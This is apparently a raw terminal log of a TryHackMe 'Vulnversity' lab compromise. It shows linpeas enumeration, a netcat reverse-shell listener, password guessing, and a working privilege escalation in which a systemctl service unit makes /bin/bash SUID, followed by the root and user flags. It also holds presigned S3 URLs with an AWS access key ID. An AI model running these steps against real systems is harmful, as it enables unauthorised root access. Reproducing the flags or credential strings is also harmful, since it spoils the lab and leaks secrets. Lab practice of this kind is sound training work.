+  - 'wget -O /etc/badr/labels.yaml "https://tryhackme-badr-deployment-production-us-east-1.s3.us-east-1.amazonaws.com/labels.yaml?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQM72S2IX6B%2F20261008%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261008T154612Z&X-Amz-Expires=480&X-Amz-Signature=cd74f7a998ac545c82316970b0b1ee59652d87884d0f3e0fee35a10a129576b4&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
+  - 'wget -O /etc/systemd/system/badr.service "https://tryhackme-badr-deployment-production-us-east-1.s3.us-east-1.amazonaws.com/badr.service?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQM72S2IX6B%2F20261008%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261008T154612Z&X-Amz-Expires=480&X-Amz-Signature=436f023367aac57e85c099639c72692b77deeb55866a5d9751bc20d758c26743&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
+══╣ EC2 Security Credentials (T1552.005,T1580)
+╔══════════╣ Processes with credentials in memory (root req) (T1003.007)            
+╚ https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#credentials-from-process-memory                                    
+gdm-password Not Found                                                              
+╔══════════╣ Processes with memory-mapped credential files (T1003.007)              
+╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                 
+╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                              
+-rw-r--r-- 1 root root 1440 Jun  6  2025 /etc/pam.d/common-password                 
+password        required                        pam_permit.so
+The password hash is from the {SSHA} to 'structural'
+╔══════════╣ Searching mysql credentials and exec (T1552.001)
+═╣ Credentials in fstab/mtab? ........... No                                        
+╔══════════╣ Searching passwords in history files (T1552.001)                       
+╔══════════╣ Searching *password* or *credential* files in home (limit 70) (T1552.001)                                                                                  
+/bin/systemd-ask-password                                                           
+/bin/systemd-tty-ask-password-agent
+/etc/pam.d/common-password
+/usr/lib/git-core/git-credential
+/usr/lib/git-core/git-credential-cache
+/usr/lib/git-core/git-credential-cache--daemon
+/usr/lib/git-core/git-credential-store
+grep: write error: Broken pipe
+$ grep -B2 -A2 "SUID\|CVE-" /tmp/linpeas_output.txt | head -60
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+--
+
+╔══════════╣ Kernel Modules Information (T1547.006)
+══╣ DiagSpill SCTP kernel exposure (CVE-2026-74469) (T1068)                         
+╚ https://access.redhat.com/security/vulnerabilities/RHSB-2026-011                  
+Potentially vulnerable kernel 5.15.0-139-generic with SCTP diagnostics reachable (sctp: module; sctp_diag: module)                                                      
+Local exploitation needs no capability or unprivileged user namespace; verify vendor backports                                                                          
+Mitigation: update the kernel, or hard-disable both sctp and sctp_diag if SCTP is unused
+══╣ net/sched action UAF exposure (CVE-2026-53264) (T1068)
+╚ https://www.cve.org/CVERecord?id=CVE-2026-53264                                   
+HIGH-RISK: potentially vulnerable kernel 5.15.0-139-generic with unprivileged user namespaces and the required traffic-control components reachable                     
+Prerequisites: user namespaces: enabled; act_gact: module; cls_flower: module
+--
+Not enforced
+
+╔══════════╣ Checking for Copy Fail (CVE-2026-31431) (T1068)
+╚ https://copy.fail/                                                                
+╚ https://www.cve.org/CVERecord?id=CVE-2026-31431                                   
+VULNERABLE: non-destructive AF_ALG/splice page-cache write triggered                
+
+--
+═╣ Data chunk limit ............. max 25 rows per KERNEL_CVE_DATA_* variable (1..26)
+═╣ Kernel config source ......... /boot/config-5.15.0-139-generic                   
+CVE: CVE-2022-0847 | Name: DirtyPipe | Match data: pkg=linux-kernel,ver>=5.8,ver<=5.16.11 | Tags: ubuntu=(20.04|21.04),debian=11 | Rank: 1                              
+CVE: CVE-2022-0995 | Name: watch_queue | Match data: pkg=linux-kernel,ver>=5.8,ver<5.16.5,x86_64 | Tags: ubuntu=21.10{kernel:5.13.0.37-generic} | Rank: 1 | Details: Not 100% reliable, may need to be run a couple of times. It rare cases it may panic the kernel.                                                                            
+CVE: CVE-2022-2586 | Name: nft_object UAF | Match data: pkg=linux-kernel,ver>=5.12,ver<5.19,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(20.04){kernel:5.12.13} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)                                                       
+CVE: CVE-2022-32250 | Name: nft_object UAF (NFT_MSG_NEWSET) | Match data: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)                                   
+CVE: CVE-2023-0386 | Name: OverlayFS suid smuggle | Match data: pkg=linux-kernel,ver>=5.11,ver<=6.2,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=22.04.1{kernel:5.15.0-57-generic} | Rank: 1 | Details: CONFIG_USER_NS needs to be enabled && kernel.unprivileged_userns_clone=1 required                         
+CVE: CVE-2025-38236 | Name: AF_UNIX MSG_OOB UAF | Match data: pkg=linux-kernel,ver>=5.15,ver<6.1.143 | Tags: 1 | Rank: Fixed in stable 6.1.143                          
+CVE: CVE-2026-43503 | Name: DirtyClone | Match data: pkg=linux-kernel,ver>=5.11,ver<5.15.208 | Tags: 1 | Rank: Fixed in stable 5.15.208; exploit path is in the networking stack and may be mitigated by removing the relevant ESP modules                  
+CVE: CVE-2026-46333 | Name: ptrace exit-race | Match data: pkg=linux-kernel,ver>=5.11,ver<5.15.207,cmd:[ "$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo 0)" -lt 2 ] | Tags: 1 | Rank: Upstream issue introduced in 4.10; fixed in 5.15.207; mitigated by kernel.yama.ptrace_scope >= 2                                           
+CVE: CVE-2026-43499 | Name: GhostLock rtmutex UAF | Match data: pkg=linux-kernel,ver>=5.11,ver<5.15.212,CONFIG_FUTEX_PI=y | Tags: 1 | Rank: Fixed in stable 5.15.212; priority-inheritance futexes must be enabled                                          
+═╣ Kernel vulns found: 9
+
+╔══════════╣ Checking for Dirty Frag (CVE-2026-43284 / CVE-2026-43500) (T1068)
+╚ https://ubuntu.com/blog/dirty-frag-linux-vulnerability-fixes-available            
+╚ https://www.cve.org/CVERecord?id=CVE-2026-43284                                   
+╚ https://www.cve.org/CVERecord?id=CVE-2026-43500                                   
+CVE-2026-43284 (xfrm-ESP): autoloadable: esp4 esp6 xfrm_user ipcomp6                
+CVE-2026-43500 (rxrpc): autoloadable: rxrpc
+modprobe mitigation (xfrm-ESP): not found
+modprobe mitigation (rxrpc): not found
+Unprivileged user namespaces: enabled
+Kernel build predates upstream fix (2026-05-08): likely unpatched unless distro backport.                                                                               
+LIKELY VULNERABLE to CVE-2026-43284 (xfrm-ESP).
+LIKELY VULNERABLE to CVE-2026-43500 (rxrpc).
+Mitigation: 'install esp4/esp6/rxrpc /bin/false' in /etc/modprobe.d/, then rmmod;
+or sysctl kernel.unprivileged_userns_clone=0; or apply distro patches.
+
+══╣ Open vSwitch forwarded-SKB page-cache LPE (CVE-2026-80977 / CVE-2026-89487 / CVE-2026-90049) (T1068)                                                                
+╚ https://blog.doyensec.com/2026/09/17/ovs.html                                     
+╚ https://lore.kernel.org/netdev/4B5CCA6E-2C49-4F86-8C4E-E1BE15C16C0A@doyensec.com/T/#t                                                                                 
+--                                                                                  
+                                                                                    
+                                                                                    
+grep: write error: Broken pipe                                                      
+$ cat /etc/passwd | grep -v nologin                                                 
+root:x:0:0:root:/root:/bin/bash                                                     
+sync:x:4:65534:sync:/bin:/bin/sync                                                  
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false  
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false                                                                                   
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false       
+syslog:x:104:108::/home/syslog:/bin/false                                           
+_apt:x:105:65534::/nonexistent:/bin/false                                           
+lxd:x:106:65534::/var/lib/lxd/:/bin/false                                           
+messagebus:x:107:111::/var/run/dbus:/bin/false                                      
+uuidd:x:108:112::/run/uuidd:/bin/false                                              
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false                             
+ftp:x:111:119:ftp daemon,,,:/srv/ftp:/bin/false                                     
+bill:x:1000:1000:,,,:/home/bill:/bin/bash                                           
+pollinate:x:103:1::/var/cache/pollinate:/bin/false                                  
+ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash                                    
+$ su kay                                                                            
+su: user kay does not exist                                                         
+$ su bill                                                                           
+Password: structural                                                                
+su: Authentication failure                                                          
+$ su ubuntu                                                                         
+Password: structural                                                                
+su: Authentication failure                                                          
+$ ftp 10.64.151.210                                                                 
+anonymous                                                                           
+Password:                                                                           
+Name (10.64.151.210:www-data): Login incorrect.                                     
+Login failed.                                                                       
+ls -la /home/bill/                                                                  
+ls -la /home/ubuntu/output to local-file: /home/bill/?                              
+local: /home/bill/: Permission denied                                               
+cat /home/bill/.bash_history 2>/dev/null                                            
+cat /home/ubuntu/.bash_history 2>/dev/null                                          
+find /home -type f 2>/dev/null                                                      
+grep -i "bill" /tmp/linpeas_output.txt | head -30                                   
+bye                                                                                 
+?Invalid command                                                                    
+?Invalid command                                                                    
+?Invalid command                                                                    
+?Invalid command                                                                    
+$ whoami                                                                            
+hostname                                                                            
+pwdwww-data                                                                         
+$ ip-10-64-151-210                                                                  
+$ whoami                                                                            
+/bin/sh: 18: pwdwhoami: not found                                                   
+$ pwd                                                                               
+/tmp                                                                                
+$ ls -la /tmp/linpeas_output.txt                                                    
+-rw-rw-rw- 1 www-data www-data 297714 Oct  8 12:05 /tmp/linpeas_output.txt          
+$ whoami                                                                            
+www-data                                                                            
+$ grep -i "password" /tmp/linpeas_output.txt | head -20                             
+gdm-password Not Found                                                              
+╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                 
+╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                              
+-rw-r--r-- 1 root root 1440 Jun  6  2025 /etc/pam.d/common-password                 
+password        required                        pam_permit.so
+The password hash is from the {SSHA} to 'structural'
+╔══════════╣ Searching passwords in history files (T1552.001)
+╔══════════╣ Searching *password* or *credential* files in home (limit 70) (T1552.001)                                                                                  
+/bin/systemd-ask-password                                                           
+/bin/systemd-tty-ask-password-agent
+/etc/pam.d/common-password
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-38.pyc
+/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py                                                               
+/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash.cpython-38.pyc
+/usr/lib/python3/dist-packages/samba/tests/__pycache__/password_hash_fl2003.cpython-38.pyc
+/usr/lib/python3/dist-packages/samba/tests/dcerpc/__pycache__/samr_change_password.cpython-38.pyc
+$ grep -iE "suid|capab" /tmp/linpeas_output.txt | head -20
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+Local exploitation needs no capability or unprivileged user namespace; verify vendor backports                                                                          
+CVE: CVE-2023-0386 | Name: OverlayFS suid smuggle | Match data: pkg=linux-kernel,ver>=5.11,ver<=6.2,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=22.04.1{kernel:5.15.0-57-generic} | Rank: 1 | Details: CONFIG_USER_NS needs to be enabled && kernel.unprivileged_userns_clone=1 required                         
+═╣ Running services with dangerous capabilities? ... 
+╔══════════╣ Network Traffic Analysis Capabilities (T1040)
+══╣ Network Interfaces Sniffing Capabilities (T1040)                                
+╚ https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-and-suid                                                      
+Pkexec binary has SUID bit set!                                                     
+Must run suid root for multiuser support.
+Must run suid root for multiuser support.
+Must run suid root for multiuser support.
+╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
+╚ https://book.hacktricks.wiki/en/linux-hardening/interesting-files-permissions/suid-sgid-and-acl-triage.html#enumerate-privileged-executables                          
+SUID file is owned by non-root user daemon: /usr/bin/at                             
+╚ https://book.hacktricks.wiki/en/linux-hardening/interesting-files-permissions/suid-sgid-and-acl-triage.html#enumerate-privileged-executables                          
+╚ https://book.hacktricks.wiki/en/linux-hardening/interesting-files-permissions/suid-sgid-and-acl-triage.html#inspect-acls-and-sensitive-paths                          
+╔══════════╣ Capabilities (T1548.001)                                               
+╚ https://book.hacktricks.wiki/en/linux-hardening/interesting-files-permissions/linux-capabilities.html                                                                 
+══╣ Current shell capabilities (T1548.001)                                          
+╚ Parent process capabilities                                                       
+$ su bill                                                                           
+Password: structural                                                                
+su: Authentication failure                                                          
+$ su ubuntu                                                                         
+Password: structural                                                                
+su: Authentication failure                                                          
+$ ssh bill@10.64.151.210                                                            
+Pseudo-terminal will not be allocated because stdin is not a terminal.              
+Could not create directory '/var/www/.ssh'.                                         
+Host key verification failed.                                                       
+$ cat /etc/passwd | grep -v nologin                                                 
+root:x:0:0:root:/root:/bin/bash                                                     
+sync:x:4:65534:sync:/bin:/bin/sync                                                  
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false  
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false                                                                                   
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false       
+syslog:x:104:108::/home/syslog:/bin/false                                           
+_apt:x:105:65534::/nonexistent:/bin/false                                           
+lxd:x:106:65534::/var/lib/lxd/:/bin/false                                           
+messagebus:x:107:111::/var/run/dbus:/bin/false                                      
+uuidd:x:108:112::/run/uuidd:/bin/false                                              
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false                             
+ftp:x:111:119:ftp daemon,,,:/srv/ftp:/bin/false                                     
+bill:x:1000:1000:,,,:/home/bill:/bin/bash                                           
+pollinate:x:103:1::/var/cache/pollinate:/bin/false                                  
+ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash                                    
+$ cat /etc/passwd                                                                   
+root:x:0:0:root:/root:/bin/bash                                                     
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                     
+bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                
+sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                
+sync:x:4:65534:sync:/bin:/bin/sync                                                  
+games:x:5:60:games:/usr/games:/usr/sbin/nologin                                     
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                     
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                        
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                         
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                   
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                 
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                          
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                       
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                    
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin   
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                          
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false  
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false                                                                                   
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false       
+syslog:x:104:108::/home/syslog:/bin/false                                           
+_apt:x:105:65534::/nonexistent:/bin/false                                           
+lxd:x:106:65534::/var/lib/lxd/:/bin/false                                           
+messagebus:x:107:111::/var/run/dbus:/bin/false                                      
+uuidd:x:108:112::/run/uuidd:/bin/false                                              
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false                             
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin                                   
+ftp:x:111:119:ftp daemon,,,:/srv/ftp:/bin/false                                     
+bill:x:1000:1000:,,,:/home/bill:/bin/bash                                           
+pollinate:x:103:1::/var/cache/pollinate:/bin/false                                  
+landscape:x:112:120::/var/lib/landscape:/usr/sbin/nologin                           
+tcpdump:x:113:123::/nonexistent:/usr/sbin/nologin                                   
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin                  
+usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin                  
+ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash                                    
+$ grep -i -B 5 "structural" /tmp/linpeas_output.txt                                 
+auth    required                        pam_permit.so                               
+-rw-r--r-- 1 root root 137 May 30  2023 /etc/pam.d/su-l
+
+
+╔══════════╣ Analyzing Ldap Files (limit 70)
+The password hash is from the {SSHA} to 'structural'                                
+$ grep -i -B 15 "structural" /tmp/linpeas_output.txt
+-rw-r--r-- 1 root root 1440 Jun  6  2025 /etc/pam.d/common-password
+password        required                        pam_permit.so
+-rw-r--r-- 1 root root 317 Dec 10  2021 /etc/pam.d/systemd-user
+-rw-r--r-- 1 root root 581 Nov 12  2015 /etc/pam.d/chsh
+auth            sufficient      pam_rootok.so
+-rw-r--r-- 1 root root 92 Nov 12  2015 /etc/pam.d/passwd
+-rw-r--r-- 1 root root 319 Feb 10  2016 /etc/pam.d/vsftpd
+-rw-r--r-- 1 root root 2133 Jan 31  2019 /etc/pam.d/sshd
+-rw-r--r-- 1 root root 1214 Jun  6  2025 /etc/pam.d/common-auth
+auth    [success=1 default=ignore]      pam_unix.so nullok
+auth    required                        pam_permit.so
+-rw-r--r-- 1 root root 137 May 30  2023 /etc/pam.d/su-l
+
+
+╔══════════╣ Analyzing Ldap Files (limit 70)
+The password hash is from the {SSHA} to 'structural'                                
+$ echo "chmod +s /bin/bash" | at now
+You do not have permission to use at.
+$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+$ bash -p
+whoami
+www-data
+exit
+$ whoami
+www-data
+$ searchsploit 2023-0386
+/bin/sh: 35: searchsploit: not found
+$ searchsploit overlayfs
+/bin/sh: 36: searchsploit: not found
+$ ssh -o StrictHostKeyChecking=no bill@10.64.151.210
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+Could not create directory '/var/www/.ssh'.
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
+Permission denied, please try again.
+Permission denied, please try again.
+bill@10.64.151.210: Permission denied (publickey,password).
+$ ssh -o StrictHostKeyChecking=no ubuntu@10.64.151.210
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+Could not create directory '/var/www/.ssh'.
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
+Permission denied, please try again.
+Permission denied, please try again.
+ubuntu@10.64.151.210: Permission denied (publickey,password).
+$ sshpass -p 'structural' ssh -o StrictHostKeyChecking=no bill@10.64.151.210 whoami
+/bin/sh: 39: sshpass: not found
+$                                                                                     
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ ping -c 2 10.64.155.19
+PING 10.64.155.19 (10.64.155.19) 56(84) bytes of data.
+
+--- 10.64.155.19 ping statistics ---
+2 packets transmitted, 0 received, 100% packet loss, time 1005ms
+
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ nmap -p- --min-rate 1000 10.64.155.19
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-08 12:49 -0400
+Nmap scan report for 10.64.155.19
+Host is up (0.17s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT     STATE SERVICE
+3128/tcp open  squid-http
+
+Nmap done: 1 IP address (1 host up) scanned in 86.21 seconds
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.151.44] from (UNKNOWN) [10.64.155.19] 56788
+Linux ip-10-64-155-19 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 13:01:58 up 13 min,  0 users,  load average: 0.09, 0.10, 0.10
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ip-10-64-155-19:/$ whoami
+id
+hostnamewhoami
+www-data
+www-data@ip-10-64-155-19:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ip-10-64-155-19:/$ find / -perm -u=s -type f 2>/dev/null
+hostnamefind / -perm -u=s -type f 2>/dev/null
+www-data@ip-10-64-155-19:/$ whoami
+whoami
+www-data
+www-data@ip-10-64-155-19:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ip-10-64-155-19:/$ hostname
+hostname
+ip-10-64-155-19
+www-data@ip-10-64-155-19:/$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/mount
+/bin/umount
+/bin/systemctl
+/bin/fusermount
+/snap/snapd/24505/usr/lib/snapd/snap-confine
+/snap/core20/2582/usr/bin/chfn
+/snap/core20/2582/usr/bin/chsh
+/snap/core20/2582/usr/bin/gpasswd
+/snap/core20/2582/usr/bin/mount
+/snap/core20/2582/usr/bin/newgrp
+/snap/core20/2582/usr/bin/passwd
+/snap/core20/2582/usr/bin/su
+/snap/core20/2582/usr/bin/sudo
+/snap/core20/2582/usr/bin/umount
+/snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2582/usr/lib/openssh/ssh-keysign
+/sbin/mount.cifs
+www-data@ip-10-64-155-19:/$ TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+systemctl link $TF
+systemctl enable --now $TFTF=$(mktemp).service
+www-data@ip-10-64-155-19:/$ echo '[Service]
+> Type=oneshot
+> ExecStart=/bin/sh -c "chmod +s /bin/bash"
+> [Install]
+> WantedBy=multi-user.target' > $TF
+www-data@ip-10-64-155-19:/$ systemctl link $TF
+Created symlink /etc/systemd/system/tmp.ICAz3zinMo.service → /tmp/tmp.ICAz3zinMo.service.
+www-data@ip-10-64-155-19:/$ ls -la /bin/bash
+systemctl enable --now $TFls -la /bin/bash
+Failed to enable unit: File /bin/bash: Invalid argument
+www-data@ip-10-64-155-19:/$ bash -p
+whoamibash -p
+www-data@ip-10-64-155-19:/$ echo $TF
+whoamiecho $TF
+whoamiecho: command not found
+www-data@ip-10-64-155-19:/$ systemctl enable --now $TF
+systemctl enable --now $TF
+Too few arguments.
+www-data@ip-10-64-155-19:/$ ls -la /bin/bash
+ls -la /bin/bash
+-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+www-data@ip-10-64-155-19:/$ bash -p
+bash -p
+www-data@ip-10-64-155-19:/$ whoami
+whoami
+www-data
+www-data@ip-10-64-155-19:/$ echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > /tmp/root.serviceecho '[Service]
+> Type=oneshot
+> ExecStart=/bin/sh -c "chmod +s /bin/bash"
+> [Install]
+> 
+WantedBy=multi-user.target' > /tmp/root.service
+www-data@ip-10-64-155-19:/$ systemctl link /tmp/root.service
+systemctl link /tmp/root.service
+Created symlink /etc/systemd/system/root.service → /tmp/root.service.
+www-data@ip-10-64-155-19:/$ systemctl enable --now /tmp/root.service
+systemctl enable --now /tmp/root.service
+Created symlink /etc/systemd/system/multi-user.target.wants/root.service → /tmp/root.service.
+www-data@ip-10-64-155-19:/$ ls -la /bin/bash
+ls -la /bin/bash
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+www-data@ip-10-64-155-19:/$ bash -p
+bash -p
+bash-5.0# whoami
+whoami
+root
+bash-5.0# id
+hostname
+cat /root/root.txt 2>/dev/null || find / -iname "root.txt" 2>/dev/nullid
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+bash-5.0# hostname
+ip-10-64-155-19
+bash-5.0# cat /root/root.txt
+<d / -iname "root.txt" 2>/dev/nullcat /root/root.txt
+a58ff8579f0a9270368d33a9966c7fd5
+bash-5.0# find / -iname "*.txt" 2>/dev/null | grep -iE "root|flag|user"
+find / -iname "*.txt" 2>/dev/null | grep -iE "root|flag|user"
+/usr/share/doc/vsftpd/examples/VIRTUAL_USERS/logins.txt
+/usr/share/doc/fail2ban/run-rootless.txt
+/usr/share/doc/cloud-init/examples/user-script.txt
+/usr/share/doc/cloud-init/userdata.txt
+/var/lib/cloud/instances/i-00ac88ef31868aa2c/user-data.txt
+/var/lib/cloud/instances/i-011a16a8a44885079/user-data.txt
+/var/lib/cloud/instances/i-0d21dd8be645c6465/user-data.txt
+/home/bill/user.txt
+/root/root.txt
+bash-5.0# cat /home/bill/user.txt
+cat /home/bill/user.txt
+8bd7992fbe8a6ad22a63361004cfcedb
+bash-5.0# echo -n "a58ff8579f0a9270368d33a9966c7fd5" | sha256sum
+echo -n "a58ff8579f0a9270368d33a9966c7fd5" | sha256sum
+cfbc740435ad60030304080e35131ffcaf8ac5f71b65e002f5b546aa3cda7ce8  -
+bash-5.0# cat /home/bill/user.txt
+cat /home/bill/user.txt
+8bd7992fbe8a6ad22a63361004cfcedb
+bash-5.0# 
+
+
+=== nmap -sC -sV ===
+# Nmap 7.99 scan initiated Thu Oct  8 10:46:23 2026 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN nmap_inicial.txt 10.67.136.59
+Nmap scan report for 10.67.136.59
+Host is up (0.17s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.5
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 49:9b:d8:3c:2a:9c:04:63:b9:6a:e0:ce:de:0e:fe:ba (RSA)
+|   256 9a:9e:50:0b:fc:5d:69:77:9b:3b:5d:68:4d:68:de:e7 (ECDSA)
+|_  256 29:88:ad:4d:2f:53:e2:d9:3d:72:9d:b7:c5:39:a1:d2 (ED25519)
+445/tcp  open  netbios-ssn Samba smbd 4
+3128/tcp open  http-proxy  Squid http proxy 4.10
+|_http-server-header: squid/4.10
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Vuln University
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: IP-10-67-136-59, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-10-08T14:47:06
+|_  start_date: N/A
+|_clock-skew: -1s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Oct  8 10:47:14 2026 -- 1 IP address (1 host up) scanned in 51.85 seconds
+
+
+=== gobuster ===
+.hta                [33m (Status: 403)[0m [Size: 279]
+.htaccess           [33m (Status: 403)[0m [Size: 279]
+.htpasswd           [33m (Status: 403)[0m [Size: 279]
+css                 [36m (Status: 301)[0m [Size: 317][34m [--> http://10.67.136.59:3333/css/][0m
+fonts               [36m (Status: 301)[0m [Size: 319][34m [--> http://10.67.136.59:3333/fonts/][0m
+images              [36m (Status: 301)[0m [Size: 320][34m [--> http://10.67.136.59:3333/images/][0m
+internal            [36m (Status: 301)[0m [Size: 322][34m [--> http://10.67.136.59:3333/internal/][0m
+index.html          [32m (Status: 200)[0m [Size: 33014]
+js                  [36m (Status: 301)[0m [Size: 316][34m [--> http://10.67.136.59:3333/js/][0m
+server-status       [33m (Status: 403)[0m [Size: 279]
+
+
+
+=== Explotación: bypass de filtro de upload ===
+Código fuente de internal/index.php revela filtro débil:
